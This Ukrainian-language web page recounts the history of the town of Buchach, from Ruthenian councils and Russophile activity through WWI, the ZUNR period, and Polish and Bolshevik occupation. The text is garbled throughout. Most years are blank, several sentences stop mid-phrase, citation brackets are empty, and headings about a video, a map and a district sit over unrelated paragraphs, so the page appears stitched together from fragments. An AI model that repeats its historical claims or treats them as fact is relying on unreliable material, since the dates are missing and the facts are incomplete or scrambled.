<p>
<p>Зокрема, окружна Руська Рада в місті скаржилася Головній Руській Раді, що: польські поміщики грабують, мучать народ руський, а австрійський уряд не перешкоджає йому, на скарги селян не звертає уваги, і, взагалі, селяни не можуть поскаржитись на пана, бо він за допомогою … властей покарає їх. Руська Рада в Бучачі повідомляла ГРР про переслідування українського селянства за підтримку вимоги поділу Галичини на 2 провінції. Скасування панщини р.</p>
<p>З  р.</p><strong><a id='y1'></a><h2>Місто на річці Стрипа: що варто подивитися і скуштувати в старовинному Бучачі (ВІДЕО)</h2></strong><p>Станом на  р. У -х роках у місті перебував білоруський та польський художник Наполеон Орда , який виконав малюнки міста. У х роках під прикриттям протидії полонізації у місті посилились позиції москвофілів. Перед Першою світовою лідерами бучацьких москвофілів були лікар доктор В. Могильницький [] , гімназійний учитель Онуфрій Ґеців платний агент. Утворене в місті відділення «Товариства ім. Качковського» утримувало бурсу для гімназистів сприяли деякі священники — Ульванський, Копистянський , найбільше гімназистів-москвофілів [] було з Джурина.</p>
<p>Почесним членом повітової філії «Просвіти» був Володимир Гнатюк  — уродженець Бучаччини [].</p><strong><a id='y2'></a><h2>Бучацький район</h2></strong><p>Бучач увійшов до го сільського змішаного округу IV курія; Бучач, Підгайці, Монастирська, Вишнівчик ; депутат — львівський адвокат доктор Генрик Ґабль , заступник — доктор Лонгин Цегельський []. На початку XX  ст. Перед I-ю світовою Бучач був одним з небагатьох повітових центрів Галичини, у якому мешкали міщани-українці; також — не було приміщення «Народного Дому» , тому мандрівний театр «Руської бесіди» вистави давав, наприклад, у заїзді Шнітліха. Під час Першої світової війни в межиріччі Серету і Стрипи проходила лінія фронту.</p><strong><a id='y3'></a><h2>Бучач — Візіком карти</h2></strong><p>На початку І-ї світової російські війська спричинили пожежу, вся середина міста і передмістя поза церкву Св. Покрови вигоріла дотла згарища залишались до початку ІІ-ї світової. З проголошенням ЗУНР частини склали зброю. Шефом експозитури для відбудови поселень був майор Віктор Лучків. Станиця жандармерії була трохи більша, ніж у мирний час, серед них — українці зокрема, заступник команданта Павло Кухтин з Переволоки.</p>
<p>Останнім повітовим старостою був Людвік Бернацький [] [b] , його заступником — барон Лєвартовський, посадником міста — Прусак.</p><img src="https://uatv.ua/wp-content/uploads/2020/01/Zapysaty-1-8.jpg" alt="Навігаційне меню" style="max-width: 480px; max-height: 480px;"/><p>Нагірянського, Кирила Крижанівського помер на тиф у таборі. Читальня «Просвіти» під час I-ї світової війни не діяла. Перехід влади до українців у місті відбувся швидко як і в Станіславі, Стрию, Коломиї, Бродах, Збаражі [] , спокійно. Першим міським головою посадником міста тоді був Рогозинський Климентій , першим державним повітовим комісаром обраний на повітовій нараді більшістю голосів  — доктор Боцюрків Іларіон. Після виборів повітового комісара на зборах 7 листопада  р. Помітний вплив на життя міста того часу мала родина його пароха о.</p>
<p>Дениса Нестайка. Травень  — червень  р. Переглядали «фатальну ситуацію на фронті», вирішили використати всі можливості для оборони Галичини, у крайньому випадку — перевести УГА за Збруч []. Важливу роль при звільненні міста відіграла артилерія УГА. В ті дні добровольцями стали УГА близько 5 мешканців міста та повіту. Місто було одним з орієнтирів планованого напрямку наступу армійських груп польських генералів Ю. Після закінчення першої світової війни почала діяти Версальсько-вашингтонська система. У липні року місто окупували польські війська.</p>
<p>Наприкінці липня — на початку серпня  р. У серпні  р. Омелянович-Павленко віддав наказ покинути місто. До 17 серпня бойових дій не було. Бучацький ревком голова М. Галон виконував декрети більшовицького Галицького революційного комітету Галревкому , що містився в Тернополі. Від більшовиків місто 16 вересня звільнили частини Дієвої Армії УНР Бучацький повіт визволяла середня група під командою генерала Олександра Загродського в складі 1-ї Запорізької, 2-ї Волинської, 6-ї січової дивізій група.</p>
<p>Тодішній польський уряд не думав надавати Галичині автономію, посилив заходи, щоб припинити український розвиток, проводячи політику полонізації.</p>
		
